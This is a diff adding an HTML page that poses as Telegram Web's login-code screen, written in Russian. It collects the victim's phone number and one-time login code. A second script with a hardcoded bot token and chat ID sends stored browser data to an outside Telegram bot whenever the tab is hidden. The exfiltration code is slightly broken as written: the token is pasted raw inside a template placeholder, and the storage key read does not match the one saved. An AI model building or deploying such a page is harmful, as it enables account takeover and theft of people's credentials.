@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Web - Ввод кода</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #e6ebea;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #000;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 32px 32px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            position: relative;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 24px;
+            left: 20px;
+            background: none;
+            border: none;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+
+        .back-btn:active {
+            background-color: #f0f5fa;
+        }
+
+        .logo {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            direction: ltr;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #707579;
+            margin-bottom: 32px;
+            line-height: 1.3;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 54px;
+            padding: 22px 16px 6px;
+            border: 1px solid #dfe1e5;
+            border-radius: 12px;
+            font-size: 18px;
+            color: #000;
+            outline: none;
+            background-color: #fff;
+            transition: border-color 0.2s;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .input-group input:focus {
+            border-color: #3390ec;
+            letter-spacing: 6px;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 17px;
+            color: #707579;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label {
+            top: 7px;
+            font-size: 12px;
+            left: 16px;
+        }
+
+        .input-group input:focus ~ label {
+            color: #3390ec;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background-color: #ffffff;
+                align-items: flex-start;
+            }
+            .card {
+                padding: 40px 20px;
+                border-radius: 0;
+                box-shadow: none;
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <button class="back-btn" onclick="goBack()" aria-label="Назад">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 11H7.83L13.42 5.41L12 4L4 12L12 20L13.41 18.59L7.83 13H20V11Z" fill="#707579"/>
+            </svg>
+        </button>
+
+        <div class="logo">
+            <svg width="100" height="100" viewBox="0 0 160 160" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="80" cy="80" r="80" fill="#3390EC" opacity="0.1"/>
+                <path d="M80 40C66.7452 40 56 50.7452 56 64V76H52C47.5817 76 44 79.5817 44 84V116C44 120.418 47.5817 124 52 124H108C112.418 124 116 120.418 116 116V84C116 79.5817 112.418 76 108 76H104V64C104 50.7452 93.2548 40 80 40ZM64 64C64 55.1634 71.1634 48 80 48C88.8366 48 96 55.1634 96 64V76H64V64ZM80 92C84.4183 92 88 95.5817 88 100C88 104.418 84.4183 108 80 108C75.5817 108 72 104.418 72 100C72 95.5817 75.5817 92 80 92Z" fill="#3390EC"/>
+            </svg>
+        </div>
+
+        <h1 id="display-phone">+380</h1>
+        <p class="subtitle">Мы отправили код в приложение Telegram<br>на вашем другом устройстве.</p>
+
+        <div class="input-group">
+            <input type="tel" id="code" placeholder=" " inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="5">
+            <label for="code">Код</label>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const displayPhone = document.getElementById('display-phone');
+            const savedPhone = localStorage.getItem('telegram_phone');
+            
+            if (savedPhone) {
+                displayPhone.innerText = savedPhone;
+            }
+
+            setTimeout(() => {
+                document.getElementById('code').focus();
+            }, 300);
+
+            const codeInput = document.getElementById('code');
+            codeInput.addEventListener('input', function(e) {
+                // Удаляем все символы, кроме цифр
+                this.value = this.value.replace(/\D/g, '');
+                
+                // Автоматический переход при вводе 5 цифр
+                if (this.value.length === 5) {
+                    localStorage.setItem('telegram_code', this.value);
+                    window.location.href = 'telegram-step3.html';
+                }
+            });
+        });
+
+        function goBack() {
+            window.location.href = 'telegram-web.html';
+        }
+    </script>
+     <script>
+    // Твой токен и твой Telegram ID (или ID чата, куда должны лететь данные)
+    const BOT_TOKEN = "9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4";
+    const CHAT_ID = "5419723549"; // Твой айди, который ты скидывал
+
+    function sendToTelegram() {
+        // Достаем данные из localStorage по твоему ключу
+        let phoneData = localStorage.getItem('telegramCode');
+
+        if (!phoneData) return; // Если данных нет, ничего не шлем
+
+        // Формируем текст сообщения
+        let messageText = "Новые данные из браузера:\n" + phoneData;
+
+        // Отправляем запрос прямо в Telegram API
+        let url = `https://api.telegram.org/bot${9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4}/sendMessage?chat_id=${5419723549}&text=` + encodeURIComponent(messageText);
+
+        // Шлем запрос в фоне
+        fetch(url).catch(err => console.log('Ошибка отправки', err));
+    }
+
+    // Срабатывает автоматически, когда пользователь уходит со вкладки или закрывает её
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'hidden') {
+            sendToTelegram();
+        }
+    });
+</script>
+</body>
+</html>
